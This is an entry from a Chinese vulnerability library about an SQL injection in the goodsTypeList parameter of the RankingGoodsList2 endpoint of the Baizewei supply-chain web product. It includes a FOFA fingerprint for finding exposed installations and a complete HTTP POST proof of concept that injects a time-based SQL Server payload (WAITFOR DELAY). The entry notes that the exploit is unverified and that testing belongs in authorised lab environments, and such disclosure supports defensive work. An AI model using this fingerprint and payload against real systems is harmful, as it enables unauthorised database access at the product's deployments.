---
source: "wy876 漏洞文库"
title: "懂微百择唯供应链 RankingGoodsList2 goodsTypeList SQL注入"
product: "懂微百择唯供应链"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "SQL Server，版本未知"
prerequisites: "无Cookie请求，权限未知"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/gqpnlboq0dt6c1f1"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E6%87%82%E5%BE%AE%E4%BF%A1%E6%81%AF%E6%8A%80%E6%9C%AF%EF%BC%88%E4%B8%8A%E6%B5%B7%EF%BC%89%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8/%E7%99%BE%E6%8B%A9%E5%94%AF%C2%B7%E4%BE%9B%E5%BA%94%E9%93%BERankingGoodsList2%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
fofa: "body=\"/Content/Css/_SiteCss/\""
fofa_unverified: "body="
id: "vw-c4a6b4f958f1332c09efb32b"
entity_id: "ve-c4a6b4f958f1332c09efb32b"
schema_version: "1"
---

# 懂微百择唯供应链 RankingGoodsList2 goodsTypeList SQL注入

## 条目说明

- 对象与具体问题：懂微百择唯供应链；RankingGoodsList2 goodsTypeList SQL注入
- 版本、配置及部署条件：SQL Server，版本未知
- 认证与权限前提：无Cookie请求，权限未知
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 5秒延时无对照返回，goodsTypeList数组及LIKE百分号上下文需源码说明
- 未给修复/版本，HTTP误标Java，可合并为规范厂商+产品目录

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 一、漏洞简介
懂微科技是一家专注于办公服务行业电商解决方案的提供商，致力于为办公服务行业赋能、提升效率和核心竞争力。百择唯·供应链作为懂微科技的重要产品之一，旨在通过数字化手段优化办公服务行业的供应链管理,提升采购效率，降低采购成本，增强企业的盈利能力。适用于各种需要优化供应链管理、提升采购效率的企业。同时，通过与合作伙伴的共享共建，构建完善的供应链生态体系，提升整体运营效率和市场竞争力。百择唯·供应链 RankingGoodsList2存在SQL注入漏洞

## 二、影响版本
+ 百择唯·供应链

## 三、资产测绘
+ fofa`body="/Content/Css/_SiteCss/"`
+ 特征


## 四、漏洞复现
```http
POST /Goods/RankingGoodsList2 HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.60 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: keep-alive
 
goodsSortType=Recommend&goodsTypeList%5B%5D=1%';WAITFOR DELAY '0:0:5'--
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/gqpnlboq0dt6c1f1>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
